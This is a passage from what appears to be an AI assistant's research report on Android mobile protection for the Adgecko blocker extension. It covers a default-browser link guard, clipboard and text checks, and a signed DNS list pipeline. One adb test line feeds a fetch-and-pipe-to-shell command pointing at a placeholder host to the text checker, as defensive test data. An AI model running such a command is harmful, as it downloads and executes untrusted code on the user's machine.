### Open questions

- Owner decision: start with Twitch only, or with Twitch and Kick together?
- Owner decision: is 360p (or a pause) during a Twitch ad break acceptable? Or must the app offer an opt-in third-party proxy, which conflicts with job 8 ('no tracking')?
- Owner decision: where does the Android code live? A new repository, or a folder in this repository? The CLAUDE.md rules (frozen files, release gate, privacy check) apply only to this repository.
- Owner decision: keep or drop the download of one real ad segment for each poll (L405-415) in the native port? This report recommends to drop it.
- What marker does a Kick media playlist show during an ad break? This needs one capture during a live Kick ad, best from the owner's region.
- What exact text do the official YouTube, Twitch and Kick apps send with ACTION_SEND on the owner's phone? A small share-inspector activity or logcat can show it.
- Which phone brand and Android version does the owner use? Samsung One UI and Xiaomi HyperOS can hide or rename 'Open by default'.
- Does Twitch serve the same tokens and the same ad behaviour in the owner's region and on a home IP? The probe used a US data-centre exit and saw no ad.
- Does Media3 1.11.1 accept a media playlist swap between two usher sessions without a reload, or does the prototype need the reload or the second-player plan? This needs an emulator or phone test.
- Approval request (deletion needs the owner's approval): may I delete .playwright-mcp/ with its two files (console-2026-11-17T03-45-28-604Z.log and page-2026-11-17T03-45-29-656Z.yml)? The browser tool created them. .gitignore line 8 ignores the folder.

<a id="web-link-text-guards"></a>
## Link guard and text guard

### Options

| # | Option | Adgecko jobs covered (2 threat, 5 clipboard, 6 pop-up, 7 one-tap fix, 8 fresh lists) | Effort (estimate) | Risk | Maintenance | Verdict |
|---|---|---|---|---|---|---|
| A | Link guard as default browser: ROLE_BROWSER, VIEW http/https filter with no host, stub CustomTabsService, local check, warning page, explicit forward to the browser that the user selected | 2 for links from SMS, chat, mail and QR apps that use the default browser or Custom Tabs; 6 partly (a page for an unexpected open, but the sender is not known); 7 (allow a domain with one tap); 8 (signed list update, no account) | Medium: 5 to 10 days for a prototype | If it crashes, links stop opening: forward on any internal error (fail-open). Custom Tabs session features are lost. WebView in-app browsers and verified App Links skip it. OEM default-browser resets not checked | Low to medium: list refresh, one test pass for each Android release | Recommend (core) |
| B | Text check: PROCESS_TEXT 'Check with Adgecko' and SEND text/plain | 5 on demand; 2 for links in any text that the user can select or share | Low: 1 to 2 days | Low. Coverage depends on the host app's text toolbar | Low | Recommend |
| C | Clipboard check from a Quick Settings tile, a launcher shortcut or a notification action (an activity reads after focus) | 5 on demand (commands, crypto addresses, seed phrases, links) | Low: 1 day | Low. Android 12+ shows 'pasted from your clipboard' once for each source app | Low | Recommend |
| D | Own QR scanner (CameraX 1.6.2 + zxing-cpp 3.1.1) into the same checker | 2 for QR links | Medium: 2 to 4 days | Needs the CAMERA permission | Low | Optional, phase 2 |
| E | No own code: URLCheck 'Hosts' module pointed at an Adgecko threat-hosts export | 2 (label only, no block) | Very low: hours | Third-party app (CC-BY-4.0). Manual list update. Label only | Low | Good first experiment |
| F | NotificationListenerService that scans all notifications for links | 2 before the tap | Medium | Reads all messages and OTP codes. Play Protect enhanced fraud protection blocks such apps from browsers and file managers. Restricted settings apply. Android 15 hides OTPs. Google already does this on Pixel | High | Reject (privacy, duplicate) |
| G | AccessibilityService that reads screens | 2, 5, 6 | High | Reads all screens. Advanced Protection allows only verified accessibility tools | High | Rejected for security |
| H | Custom keyboard (IME), the only normal app that can read the clipboard in the background | 5 in the background | High | The keyboard sees all typed text, also passwords | High | Rejected for security |
| I | User CA for HTTPS interception, or root | 1 to 6 | High | Breaks the trust model of TLS and of the OS | High | Rejected for security |
| J | Shizuku or adb-level helper to change App Link handling (LinkSheet style) | 2 for verified domains | Medium | Gives a background app adb-level rights | Medium | Reject (verified domains are lower risk) |
| K | Built-ins only: Chrome Safe Browsing, Google Messages link checks and Enhanced protection, Play Protect, Advanced Protection | 2 mostly; not 5; not 7 | None | Coverage varies by device, region, browser and app. No own allow list. Advanced Protection blocks sideloaded APKs | None | Keep on in all cases (baseline) |
| L | Private DNS with a filtering resolver (system setting) | 2 for all apps, also WebViews | Very low | The resolver sees all DNS queries. Not checked in this session (other research area) | Low | Complement |

### Prototype sketch

GOAL: one small sideloaded APK, 'Adgecko Link Guard'. It reuses Adgecko's threat hosts, PSL data, signed-feed format and clipboard patterns as DATA. It has no network access on the link path, no account and no analytics. All behaviour on a phone is UNVERIFIED until a run on the owner's phone.

1. BUILD SETUP
- Separate Gradle repository (Adgecko has no build step; CLAUDE.md). Licence GPL-3.0, same as Adgecko.
- minSdk 33 (Ed25519 in java.security.Signature is API 33+). targetSdk 36. Android Gradle Plugin 9.5.1 (checked 2026-11-17). Kotlin version not checked.
- Libraries (versions checked on Maven 2026-11-17): androidx.browser:browser 1.10.0 (Apache-2.0, CustomTabsService base class); androidx.core:core 1.19.1 (Apache-2.0, RoleManagerCompat); phase 2: androidx.camera:camera-core/camera-camera2/camera-lifecycle 1.6.2 (Apache-2.0) and io.github.zxing-cpp:android 3.1.1 (Apache-2.0). Apache-2.0 into GPL-3.0 is one-way compatible (not checked in this session). No Google Play services. Use the platform JobScheduler for list updates (no WorkManager).

2. MANIFEST
- LinkGateActivity: exported, translucent theme, noHistory, excludeFromRecents, own taskAffinity. Filter 1: VIEW + DEFAULT + BROWSABLE, data scheme http and https, NO host (this makes the filter a browser filter). Filter 2: VIEW + DEFAULT + BROWSABLE + http/https + mimeType text/html, text/plain, application/xhtml+xml (as URLCheck).
- CheckTextActivity: exported. PROCESS_TEXT text/plain (label 'Check with Adgecko'). SEND text/plain.
- ClipboardCheckActivity: not exported. It reads the clip in onWindowFocusChanged(true).
- ClipboardTileService: BIND_QUICK_SETTINGS_TILE, action QS_TILE. onClick -> startActivityAndCollapse(PendingIntent.getActivity(..., FLAG_IMMUTABLE)) on API 34+.
- StubCustomTabsService: exported, action android.support.customtabs.action.CustomTabsService, extends androidx CustomTabsService, returns true and does nothing (as LinkSheet).
- queries: intent VIEW + BROWSABLE + https (list browsers); intent action CustomTabsService (find Custom Tabs browsers).
- Permissions: INTERNET only for the optional signed list update; CAMERA only in phase 2. NO QUERY_ALL_PACKAGES, NO notification listener, NO accessibility, NO SYSTEM_ALERT_WINDOW.
- Setup screen: RoleManager.createRequestRoleIntent(ROLE_BROWSER); a list of browsers to forward to (exclude own package).

3. CHECKER (pure Kotlin module, no Android classes, unit tests on the JVM)
- ThreatSet: reads threat-hosts data into a HashSet<String>. match(host) checks the host, then each parent (requestDomains semantics). 15,865 hosts today.
- UserLists: allow list and block list of registrable domains (job 7). An allow entry never overrides a threat hit without a second confirmation (as 'Allow this site' in the extension).
- UrlRisk(url) -> findings: THREAT_HOST (block); USERINFO_TRICK ('@' in the authority); IP_LITERAL; PUNYCODE (decode with android.icu.text.IDNA UTS46; flag mixed scripts with android.icu.lang.UScript); NOT_HTTPS; SHORTENER (small host list); DEEP_SUBDOMAIN with a brand word; NON_STANDARD_PORT. The page always shows the registrable domain in large text (port registrableDomain() from psl.js).
- TextRisk(text) -> findings: SHELL_COMMAND (the 21 Adgecko patterns, compiled with CASE_INSENSITIVE; Android regex uses Unicode classes, which matched JavaScript in my JVM test only with UNICODE_CHARACTER_CLASS); LINKS (each one through UrlRisk); CRYPTO_ADDRESS (Base58Check, Bech32/Bech32m, EIP-55 checks; show the first and last 6 characters large); SEED_PHRASE (12 or 24 BIP-39 words: warn 'never paste a recovery phrase'; wordlist licence not checked).
- Time budget: no network, no disk on the hot path. Data is in memory after the first start.

4. DATA FROM THE ADGECKO REPOSITORY (future work, needs owner approval; this task changed no file)
- A generator script (for example scripts/export-mobile-data.mjs) writes threat-hosts.txt (from threat-snapshot.json or the list refresh), psl.json (full PSL, not only the subset), clipboard-patterns.json (id + source + flags, extracted as in my test) and fixtures.json (samples + expected ids).
- The feed signer signs the bundle with the existing Ed25519 key format. The app verifies the exact bytes with Signature.getInstance('Ed25519') before it parses JSON (same order as src/feed/verify.js). Update source: HTTPS only, no redirects, size cap, no cookies, through JobScheduler, 1 time each day. The APK also ships a snapshot.
- The same fixtures.json runs in Deno against clipboard.js and in JVM and Android tests against the Kotlin port. A difference fails CI.

5. DATA FLOW: LINK
(1) The user taps a link in SMS, chat or mail. (2) Android sends it to a verified app, if one exists; else to the default browser, which is LinkGateActivity. Apps that use Custom Tabs with a browser list also select the guard, because the guard has a CustomTabsService. (3) The guard accepts only http and https. It normalises the host (lowercase, trailing dot removed, IDNA to ASCII). (4) It checks: user block list, threat set, user allow list, heuristics. (5) No finding: build Intent(ACTION_VIEW, uri), setPackage(selectedBrowser), copy only extras with the customtabs prefixes (as LinkSheet), add FLAG_ACTIVITY_NEW_TASK, start it, finish(). Loop guard: the target is never the own package; if the same URL comes back within 5 s from the same package, show the page and do not forward again (URLCheck RejectionDetector idea). If the selected browser is not installed, show the browser list. (6) Finding: show the warning page. It shows the registrable domain, the reasons and the sender (marked 'not reliable', from getReferrer). Buttons: 'Go back' (default), 'Copy link', 'Allow this domain' and 'Open anyway' (two steps). 'Expand short link' sends one HEAD request to the shortener host only, with redirects off, only after a tap. (7) On any internal error: forward the link (fail-open, as the extension's guards) and log the error locally.

6. DATA FLOW: TEXT AND CLIPBOARD
- PROCESS_TEXT or SEND -> CheckTextActivity -> TextRisk -> result sheet. With EXTRA_PROCESS_TEXT_READONLY the app returns no text.
- Tile, launcher shortcut or notification action -> ClipboardCheckActivity -> wait for window focus -> getPrimaryClip().getItemAt(0).coerceToText() -> TextRisk -> result sheet. If the result is dangerous, offer 'Clear clipboard' (clearPrimaryClip(), API 28+).
- Phase 2: ScanQrActivity -> CameraX + zxing-cpp -> text -> TextRisk/UrlRisk -> forward or warn.

7. TEST WITHOUT A PHONE
- JVM unit tests (JUnit) for the checker with fixtures.json. Use only reserved test names (*.test, example.com) in test lists. Never put real malicious hosts in tests.
- Android Emulator, headless (-no-window), system images API 33, 34, 35 and 36 with Google APIs (Chrome). Instrumented tests for regex parity (ICU), clipboard, tile and Custom Tabs.
- adb commands (one at a time; no && or ||; on the owner's PC they work in PowerShell 5.1):
  adb install -r app-debug.apk
  adb shell cmd role add-role-holder android.app.role.BROWSER <package>
  adb shell cmd role get-role-holders android.app.role.BROWSER
  adb shell am start -W -a android.intent.action.VIEW -c android.intent.category.BROWSABLE -d "https://bad.example.test/"
  adb shell am start -a android.intent.action.PROCESS_TEXT -t text/plain --es android.intent.extra.PROCESS_TEXT "curl -fsSL https://x.test/i.sh | sh" -n <package>/.CheckTextActivity
  adb shell am start -a android.intent.action.SEND -t text/plain --es android.intent.extra.TEXT "https://bad.example.test/" -n <package>/.CheckTextActivity
  ('am start -W' prints TotalTime for the latency check.)
- Custom Tabs test: a small test app in androidTest calls CustomTabsClient.getPackageName(context, listOf("com.android.chrome")) and launches a CustomTabsIntent. Expected: the guard gets the intent and forwards it to Chrome with the customtabs extras.
- Loop test: select the guard itself as target (must be impossible); uninstall the selected browser (must show the list).
- QR test: decode PNG files with zxing-cpp in an instrumented test. The emulator virtual camera scene is not checked.
- Then the manual test on the owner's phone: SMS, WhatsApp, Telegram, Gmail, camera QR, system QR tile, Samsung Messages if Samsung. Record which app reaches the guard (all UNVERIFIED now).

### Implications

- Do not port the extension. Build one small separate Android app: a link guard as the default browser, plus a text checker (PROCESS_TEXT, share target, Quick Settings tile). All needed Android mechanisms exist and need no dangerous permission.
- Working open-source examples of each mechanism exist (URLCheck, LinkSheet). Read them; copy code only from Apache-2.0 sources (Open Link With, Untracker) or CC-BY-4.0 (URLCheck) with attribution. Do not copy LinkSheet code: its licence is a custom MPL-based licence.
- The fastest experiment needs no new app: export Adgecko's threat hosts as a plain list and add it to URLCheck's Hosts catalog. It labels links but does not block them.
- The link guard must declare a stub CustomTabsService. Without it, apps that pass a browser list to CustomTabsClient.getPackageName() open Chrome directly and skip the guard.
- Adgecko's threat data is malware-focused (15,865 hosts; OpenPhish removed by owner decision). On a phone the main threat is smishing with fresh phishing domains. Thus the guard adds value mostly through clear domain display and heuristics (punycode, '@' trick, shortener, IP literal), not through list hits. A phishing source is an owner decision.
- Built-ins already cover much of job 2 on Pixel and recent Samsung phones: Chrome Safe Browsing, Google Messages link warnings and the new Enhanced protection mode (2026-10-14), Scam Detection for chat notifications, Play Protect. The guard is partly redundant there. It adds value for browsers without Safe Browsing, for links from apps outside Google's checks, for an own allow and block list, and for job 5, which no built-in feature does.
- Job 5 (clipboard guard) can only be on demand on Android. No normal app can watch the clipboard in the background since Android 10. The background options (IME, Accessibility) are rejected for security. ClickFix paste-to-terminal attacks are not reported on Android; keep the patterns for commands that a user carries to a PC, and add crypto-address and seed-phrase checks.
- Job 6 (pop-ups) is mostly done by Android: background activity starts are restricted since Android 10, and Android 17 hardens them again. The guard sees browser opens from in-app ads, but it cannot know if the user tapped, because the sender identity is not reliable.
- Reject the notification listener: it reads all messages and codes, it triggers Play Protect enhanced fraud protection for installs from browsers and file managers, and Google already does this scan.
- Install path: adb installs stay possible under Google developer verification. Samsung Auto Blocker (on by default) and Android Advanced Protection block unknown-source apps; the owner may have to pause them for an install and turn them on again. Name this trade-off to the owner; do not suggest to leave them off.
- Make the pattern and data files the single source: generate them from the Adgecko repository and run the same fixtures in Deno and on Android. My JVM test showed one real difference (no-break space and \s), thus a parity test is necessary.
- Repository rules: this task changed no file. A generator script, a mobile data export or a new repository needs the owner's approval. Mark all phone behaviour UNVERIFIED in HANDOFF.md until a run on the owner's phone.
- Checked in this session: AOSP role, intent-filter, Custom Tabs and clipboard source; Android 10, 12, 17 behaviour pages; package visibility pages; Activity, Intent, Pattern, Signature and ICU references; manifests and code of URLCheck, LinkSheet, Open Link With and Untracker; Google blog posts of 2025-05-13, 2025-10-15 and 2026-10-14; Advanced Protection help page; developer verification FAQ; Samsung Knox Auto Blocker page; CSA press release; Maven versions; Adgecko threat data, PSL, feed and clipboard files; a JS-versus-Java regex test. Not checked: phone behaviour of any app, QR scanner intents, in-app browser use of popular apps, Chrome Safe Browsing details (search summary only), smishing, quishing and malvertising numbers (secondary sources), adb under Advanced Protection, latency.

### Findings

| Topic | Claim | Status | Confidence | Date | Sources |
|---|---|---|---|---|---|
| 1. Link guard: browser role qualification | The browser role is exclusive and the user selects the holder. The system does not check the three requirements on source.android.com (http page, link navigation, geolocation). The code checks only the intent filter. An exported activity must match ACTION_VIEW + CATEGORY_BROWSABLE + scheme http, and the filter must handle all web data: http/https with no host, or CATEGORY_APP_BROWSER. On API 34+ the role holder also gets PROVIDE_OWN_AUTOFILL_SUGGESTIONS. Thus a small app without a web engine can hold the role. | checked | high | AOSP main branch, read 2026-11-17 | https://android.googlesource.com/platform/packages/modules/Permission/+/refs/heads/main/PermissionController/res/xml/roles.xml<br>https://android.googlesource.com/platform/packages/modules/Permission/+/refs/heads/main/PermissionController/role-controller/java/com/android/role/controller/behavior/BrowserRoleBehavior.java<br>https://android.googlesource.com/platform/frameworks/base/+/refs/heads/main/core/java/android/content/IntentFilter.java<br>https://source.android.com/docs/core/config/android-roles |
| 1. Link guard: Android 12+ intent resolution and App Links | From Android 12, a generic web intent goes to an app only if that app is approved for the domain: by App Links verification or by user selection. In all other cases it goes to the default browser. Thus the link guard gets each tapped link that no verified app claims. Verified App Links (for example a bank domain in the bank's own app) skip the guard. This is acceptable: a phishing domain cannot be verified for a legitimate installed app. | checked | high | page read 2026-11-17 | https://developer.android.com/about/versions/12/behavior-changes-all |
| 1. Link guard: package visibility (Android 11+) | startActivity() does not need package visibility, for implicit and for explicit intents. Thus the guard can forward to a browser with setPackage() and no queries element. To list the installed browsers, add a queries intent (VIEW, BROWSABLE, https). To find Custom Tabs browsers, add a queries intent with action android.support.customtabs.action.CustomTabsService. QUERY_ALL_PACKAGES is not necessary. | checked | high | pages read 2026-11-17 | https://developer.android.com/training/package-visibility/use-cases<br>https://developer.android.com/training/package-visibility/automatic |
| 1. Link guard: Custom Tabs | androidx CustomTabsClient.getPackageName() first tries the default VIEW handler, but it uses that handler only if it has a CustomTabsService. If it has no such service, the library returns the next package in the caller's list (for example Chrome). The app then sends an explicit intent to that browser, and the link guard never sees the link. URLCheck and LinkSheet declare a stub CustomTabsService for this reason. LinkSheet keeps the customtabs extras when it forwards. The forwarded Custom Tab has no session with the real browser. Session callbacks and partial (bottom-sheet) tabs probably stop working (UNVERIFIED). Apps that set no package send a plain VIEW intent, and this intent goes to the guard. | checked | high | source read 2026-11-17; app behaviour UNVERIFIED | https://android.googlesource.com/platform/frameworks/support/+/refs/heads/androidx-main/browser/browser/src/main/java/androidx/browser/customtabs/CustomTabsClient.java<br>https://github.com/TrianguloY/URLCheck (app/src/main/java/com/trianguloy/urlchecker/services/CustomTabs.java, commit ca3bb00, 2026-11-08)<br>https://github.com/LinkSheet/LinkSheet (customtab/LinkSheetCustomTabsService.kt, resolver/util/CustomTabHandler.kt, commit ccbdac5, 2026-11-16) |
| 1. Link guard: forwarding without a loop | An implicit VIEW intent from the guard comes back to the guard, because the guard is the default browser. Thus the guard must forward with setPackage() to a browser that the user selected, and it must never forward to its own package. URLCheck removes its own package from the list (IntentApp.getOtherPackages). URLCheck also has a RejectionDetector: if the same URL comes back from the same app within 5 seconds, that app 'rejected' it, and URLCheck hides that app as a target. | checked | high | commit ca3bb00, 2026-11-08 | https://github.com/TrianguloY/URLCheck (utilities/wrappers/RejectionDetector.java, utilities/wrappers/IntentApp.java, modules/list/OpenModule.java) |
| 1. Link guard: who sent the link | Activity.getReferrer() returns EXTRA_REFERRER or the launching package, but the docs say that apps can spoof it. getLaunchedFromPackage() (API 34) gives the sender only if the sender opts in with ActivityOptions.setShareIdentityEnabled(true). Thus the guard cannot reliably know which app opened a link, or if the user tapped it. | checked | high | page read 2026-11-17 | https://developer.android.com/reference/android/app/Activity |
| 1. Link guard: latency | The guard adds one activity start and one local set lookup before the browser starts. My estimate is below 200 ms on a modern phone with a translucent activity that finishes at once. This is an estimate only. Measure it with 'adb shell am start -W' (TotalTime). | not checked | low |  |  |

### Open questions

- Which phone brand, model and Android version does the owner use? Samsung (Auto Blocker, Samsung Messages) and Xiaomi (possible default-browser resets, not checked) need extra steps.
- Which browser does the owner use for real browsing (Chrome, Firefox, Samsung Internet, Brave)? Does it support Custom Tabs? It is the forward target.
- Which apps send most links to the owner (Google Messages, Samsung Messages, WhatsApp, Telegram, Signal, Gmail)? Which of them use an in-app WebView browser and thus skip the guard? This needs a test on the phone.
- Is Advanced Protection on, or will the owner turn it on? It blocks unknown-source installs and updates. Do adb installs work while it is on?
- Do the owner's camera QR scanner and the system QR tile send a plain VIEW intent to the default browser?
- Does the owner want a phishing source in the threat data? OpenPhish-based lists are excluded by decisions #13 and #18b. Which source is acceptable?
- Should the app download signed list updates (INTERNET permission, feed host decision D-1 still open), or only update with each new APK?
- Should the guard show a page for every link (confirm mode) or only for findings? Should 'confirm mode' be per sending app?
- Should the Android app live in a separate repository? Who builds and signs the APK?
- Which country is the owner in? This changes the scam patterns, the shortener list and which Google features are available.

<a id="web-list-service"></a>
## One list service for several devices

### Options

| # | Option | Adgecko jobs covered (1 ads, 2 malware, 3 hide boxes, 4 video ads, 5 clipboard, 6 pop-ups, 7 fix/allow, 8 fresh lists, no account) | Effort | Risk | Maintenance | Verdict |
|---|---|---|---|---|---|---|
| A | CI job builds a DNS domain list and a signed manifest, then publishes them on GitHub Pages. The phone app filters on the device (VpnService, DNS only). | Phone, all apps: 1, 2, 7 (per domain and per app), 8 (the reader needs no account). Not 3, 4, 5, 6. | CI: 1 to 2 days. App: 1 to 2 weeks. | Low to medium. Android has one VPN slot. A Chrome custom DoH setting can bypass the filter (UNVERIFIED). The URLhaus licence question. | Low. Commit once every 60 days, or GitHub disables the schedule. | Recommend (core). |
| B | The same CI job also signs feed.json (threat tier, format 1, about 333 KB) and turns the dormant Chrome feed on. | PC Chrome: 2 (fresher threat hosts). Phone: 2 (same file, same key format). | Small: keys, FEED_ORIGIN, 1 host permission. A project Pages site needs a client change (path prefix) and a gate change. | Medium. A key in a CI secret lets an attacker sign block-only rules (4,500 x 80 hosts maximum, 14 days maximum). Keep the kill key offline. | Low. Weekly key check, rotation by an extension update. | Recommend, after the owner decides D-1 and D-7. |
| C | Chrome reads the compiled output and stops downloading the 8 lists. | PC: 1, 2, 8 with 1 host instead of 9. | High: new signed format 2 with DNR and cosmetic rules. The 512 KB cap is too small. | Medium: one point of failure. | Medium. | Defer. Not necessary for the phone. |
| D | Cloudflare Zero Trust Gateway (free). A CI step syncs the top 100,000 hosts into 100 lists of 1,000. Android uses Private DNS with the location's DoT hostname. Chrome or Windows uses the DoH URL. | Phone all apps and PC: 1, 2. 7 only through the dashboard. | Medium: API token secret and policy set-up. | Medium. All queries go to Cloudflare under the owner's account. That conflicts with job 8 (no account). The list must be trimmed by half. | Medium: token rotation, limits can change. | Optional. Owner decision. |
| E | Own serverless-dns on Workers with a custom trie built in CI and stored on R2. | Chrome on both devices (DoH): 1, 2. Not Android Private DNS (DoH only). | High: fork, trie build, R2, deployment. | Medium to high. 10 ms CPU on Free (fit not checked). Cloudflare sees the queries. Account necessary. | High. | Not recommended now. |
| F | Public RethinkDNS resolver with a blockstamp for 7 of the 8 sources. | Chrome custom DoH: 1, 2. | Very low. | A third party sees all queries. No Adgecko list control. No uBlock badware. | None. | Fallback only. |
| G | GitHub Release asset as the host. | Same as A. | Low. | The redirect to release-assets.githubusercontent.com breaks the feed client (redirect: "error"). | Low. | Rejected for the feed. |
| H | raw.githubusercontent.com as the host. | Same as A. | Low. | The URL has a path. Stricter unauthenticated rate limits since 2025-05. | Low. | Not recommended. |
| I | Windows PC as a home DNS server (AdGuard Home or Technitium). | Home network only: 1, 2. | Medium. | Needs an inbound firewall rule for port 53. No filter outside the home. The PC must run all the time. | Medium. | Rejected for security. |
| J | Allow-list sync with a file or a QR code. | 7 across devices. | Small for a JSON file. Medium for a QR code. | Low. | Low. | Do it only for threatAllowDomains ("Allow this domain"). siteOverrides have no DNS meaning. |

### Prototype sketch

GOAL: one CI job builds the outputs. The phone app reads them with no account. A cloud resolver is optional. All behaviour below is UNVERIFIED until a run on the owner's PC and phone proves it.

1. CI workflow (new file, for example .github/workflows/lists.yml, in a public repository)
- Triggers: schedule "41 5,17 * * *" (twice each day, not at minute 0) and workflow_dispatch. Top-level permissions: {}.
- Job build (runs-on ubuntu-24.04, contents: read). Use the same pinned checkout v7.0.1 and setup-deno v2.0.5 as checks.yml.
  a. python3 -I scripts/pack-filter-lists.py. It downloads the 8 lists once and writes scripts/.list-cache/ and meta.json sha256 values in the runner workspace only. Nothing is committed.
  b. New script scripts/build-dns-list.mjs, offline, like build-threat-rules.mjs. It reuses parseEntries (src/general/update.js), the threat compiler and protected-hosts.js. Output in out/v1/:
     - domains.txt.gz: whole-domain block hosts only. No initiatorDomains, no domainType, no main_frame-only rules. About 199,000 lines, 1.5 MB.
     - threat.txt: 15,865 hosts.
     - feed.json: threat tier, format 1, about 333 KB, notAfter = createdAt + 13 days, serial = YYYYMMDDHH.
     - manifest.json: a new document kind, for example {"format":1,"kind":"dns-lists","serial":...,"createdAt":...,"notAfter":...,"files":[{"path":"v1/domains.txt.gz","sha256":"...","bytes":...,"count":...}],"sources":[{"id":"easylist","sha256":"...","fetchedAt":"..."}]}.
     - LICENSES.md with a credit line for each source.
     - Sanity limits, the same as the client: 25 % maximum change, minimum counts, protected hosts. If a limit fails, the job fails and publishes nothing.
  c. actions/upload-artifact (GitHub-owned, pin a SHA).
- Job sign (needs build, environment "feed-signing" with the secrets FEED_KEY_JSON and LIST_KEY_JSON; optional required reviewer).
  - Write each key to $RUNNER_TEMP with umask 077. Run scripts/feed-sign.mjs --feed out/v1/feed.json. A new small script signs manifest.json with the LIST key in the same two-line format (keyId=<id>, base64 signature). Delete the key files. Use separate keys, so that a stolen list key cannot sign threat rules.
- Job deploy (needs sign, permissions pages: write and id-token: write, environment github-pages). actions/upload-pages-artifact@fc324d3547104276b827a68afc52ff2a11cc49c9 (v5.0.0) and actions/deploy-pages@368f82528645a54fb793d4d04e342629a3f51346 (v5.0.1).
- Host (D-1): a Pages user site https://<owner>.github.io (bare origin, fits the client today). That needs a second repository, <owner>.github.io, that runs this workflow and checks out the public Adgecko repository. Alternative: a project Pages site with a client change that permits a path prefix (gate change, owner approval). A custom domain is the third choice. Do not invent a domain.

2. Phone app (Kotlin, minSdk 33, sideload with adb)
- ListSyncWorker: androidx.work 2.12.0, PeriodicWorkRequest 12 h, network constraint. OkHttp 5.5.1 with followRedirects(false), a size cap for each file, no cookies. Order: manifest.json.sig, then manifest.json. Then verify. Then download domains.txt.gz and compare its sha256 with the manifest.
- Verifier: a Kotlin port of canonical.js and schema.js. Ed25519 through Tink 1.24.0 subtle.Ed25519Verify. It takes the same base64 raw 32-byte keys as src/feed/keys.js. The app pins LIST_KEYS, FEED_KEYS and KILL_KEYS. Serial and notAfter rules are the same as the extension. The app ignores resourceTypes (DNS blocks all types) and keeps the last two good files.
- DomainSet: hosts in reversed-label order in one sorted byte array, with binary search for each suffix. About 4 to 5 MB of RAM. A HashSet<String> needs much more memory.
- DnsVpnService (VpnService): TUN with addresses 10.111.222.2/32 and fd00:6a::2/128. addDnsServer 10.111.222.1. addRoute only for that address and fd00:6a::1 (DNS-only routing). Read UDP port 53. For a blocked name, answer NXDOMAIN (or 0.0.0.0 and ::). Forward other queries upstream through a socket that is passed to protect(), with plain UDP or DoT to a resolver that the user selects. Per-app opt-out: addDisallowedApplication. Settings: an allow list (the same meaning as threatAllowDomains), export and import as a JSON file, a Quick Settings tile.
- Chrome on the phone: keep 'Use secure DNS' on automatic. A custom provider can bypass the local filter (UNVERIFIED).

3. Optional cloud resolver
- Gateway: a separate CI job, opt-in, with a CF API token secret. It takes the top 100,000 hosts (all threat hosts first) and does a PUT of 100 lists of 1,000 to /accounts/{account_id}/gateway/lists/{list_id} (600 requests each minute maximum). One DNS policy blocks 'Domain in list 1..100'. Android: Private DNS = the location's DoT hostname. PC: Chrome custom DoH = the location's DoH URL.
- serverless-dns: fork serverless-dns/blocklists. Add one config.json entry with format 'domains' and the Pages URL of domains.txt. Build the trie in CI, put it on R2 and set CF_BLOCKLIST_URL. Chrome can use it through DoH only.

4. Tests without a phone
- Deno, in CI and on the PC: make a test key pair in a temporary folder with scripts/feed-keygen.mjs. Run build-dns-list.mjs on a fixed cache fixture. Verify feed.json with the existing src/feed/verify.js. Verify manifest.json with the same canonical.js signature code.
- JVM unit tests (Gradle, no device): cross-language vectors. Tink must accept the files that Deno signed and must reject them after a change of one byte. Port the schema cases from the repository's feed tests. Test the DNS handler as a pure function from bytes to bytes, with packets made by hand. Test the worker with Robolectric and the WorkManager test helpers.
- Android Emulator (API 35, x86_64): install the debug APK with adb. Use a debug-only test origin and adb reverse for a local HTTPS test server. Read the result in logcat.
- Cloud resolver: send a DoH request with curl (Accept: application/dns-message) for a blocked test domain and for an allowed domain.

### Implications

- A scheduled GitHub Actions job can build both outputs. The DNS list (about 199,000 hosts, 1.5 MB gzip) and the threat feed (about 333 KB, under the 512 KB cap) are small for GitHub Pages (1 GB site, 100 GB each month). Standard runners are free in a public repository.
- The full DNS list cannot go in feed.json format 1 (512 KB cap, threat priority only). Use a separate signed manifest that gives the sha256 of each large file. Keep the existing two-line .sig format and raw Ed25519 keys, so that the Chrome code and the Android code share one verifier design.
- The current feed client accepts only a bare https origin with no redirects. GitHub Release assets (they redirect) and raw.githubusercontent.com (it has a path) do not work. A Pages user site or a custom domain works with no code change. A project Pages site needs a small client change and a gate change, and the owner must approve both.
- D-7 has a trade-off. A CI signer gives automatic freshness within the 14-day notAfter limit. But a GitHub account compromise then lets an attacker sign block-only rules. The limits (block only, protected hosts, 4,500 x 80 hosts, 14 days, kill key offline) limit the damage to blocked sites, not code execution. Signing by hand on the PC means work every 10 to 13 days.
- Use one key pair for each document kind: feed key, kill key and a new list key. A stolen list key must not be able to sign threat rules.
- The URLhaus licence statement in the repository may be old. Since 2025-11 the abuse.ch terms no longer name CC0 for URLhaus, and they forbid derivative works without consent. The owner must decide before a public compiled list includes URLhaus hosts. The packed extension zip already carries those hosts.
- The Peter Lowe page permits combination and publication. The repository's 'non-commercial' text did not appear on the pages that I read. Keep the credit line and update the licence text after an owner check.
- DNS filtering covers jobs 1 and 2 for all apps, and job 7 for each domain or app. It cannot do jobs 3, 4, 5 and 6. Those jobs stay in the browser.
- For all apps on Android with no own app, only a resolver with DoT works through Private DNS (for example a Cloudflare Gateway location). Android uses DoH only for Google and Cloudflare's public resolvers. A Workers DoH resolver covers only Chrome.
- Every cloud resolver option sends all DNS queries to Cloudflare or RethinkDNS and needs an account (except the public RethinkDNS resolver). That conflicts with the 'no account, no tracking' job. The on-device filter in the phone app keeps the current privacy level.
- Cloudflare Gateway Standard holds 100,000 entries maximum (100 x 1,000). Adgecko must give priority to threat hosts and trim the ad list by half.
- Allow-list sync is useful only for threatAllowDomains ('Allow this domain'). The per-site switches (siteOverrides) have no DNS equivalent. A JSON file export and import is cheap. A QR code is a later step.
- Do not host a DNS filter on the Windows PC for the home network. It needs an inbound port 53 firewall rule, and the rule forbids that. It also does not protect the phone outside the home.
- A scheduled workflow in a public repository stops after 60 days without repository activity. Add a check for this to the owner's routine, or let a visible status in the app warn when the manifest is old.
- Downloads from GitHub runners to the 8 list hosts are UNVERIFIED. One CI download twice each day replaces one download for each Chrome copy, so it reduces the load on the list hosts.

### Findings

| Topic | Claim | Status | Confidence | Date | Sources |
|---|---|---|---|---|---|
